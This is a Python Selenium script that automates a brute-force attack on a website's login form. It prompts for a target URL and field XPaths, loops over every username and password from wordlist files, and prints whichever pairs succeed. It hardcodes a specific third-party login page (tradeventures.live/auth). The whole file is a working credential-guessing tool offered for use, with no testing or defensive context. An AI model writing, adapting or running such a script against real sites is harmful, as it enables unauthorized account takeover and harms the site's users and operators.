from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

U = input('Enter the Target Website Url')

a = input('Enter the xpath of username field:')
b = input('Enter the xpath of password field:')
c = input('Enter the xpath of login/submit button field:')

# Initialize the Chrome WebDriver
driver = webdriver.Chrome()  # Ensure chromedriver is in PATH or specify the path

# Open the target URL
driver.get(U)  # Replace with the actual URL

# Example function to login
def test_login(username, password):
    try:
        # Locate username and password fields using XPath
        username_field = driver.find_element(By.XPATH, a)
        password_field = driver.find_element(By.XPATH, b)
        login_button = driver.find_element(By.XPATH, c)

        # Input credentials
        username_field.clear()  # Clear field before input
        password_field.clear()  # Clear field before input
        username_field.send_keys(username)
        password_field.send_keys(password)
        login_button.click()

        # Wait for a potential redirection indicating login status
        WebDriverWait(driver, 1).until(
            lambda d: d.current_url != 'https://tradeventures.live/auth'  # Wait for URL to change
        )

        # Check if the current URL indicates a successful login
        if 'Dashboard' in driver.current_url:  # Adjust the URL segment as needed
            print(f'Successful login: {username}:{password}')
            return True
        else:
            print(f'Failed login: {username}:{password}')
            return False

    except Exception as e:
        print(f"Error during login: {e}")
        return False
    finally:
        # Return to the login page for the next iteration
        driver.get('https://tradeventures.live/auth')  # Replace with the actual URL

# Function to read usernames and passwords from files
def read_lines_from_file(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file.readlines()]

# Example usage
if __name__ == '__main__':
    usernames = read_lines_from_file('usernames.txt')
    passwords = read_lines_from_file('password.txt')

    for username in usernames:
        for password in passwords:
            if test_login(username, password):
                # Successful login detected and handled
                pass  # Additional logic can be added here if needed
            else:
                # Failed login detected and handled
                pass

    # Close the WebDriver instance
    driver.quit()
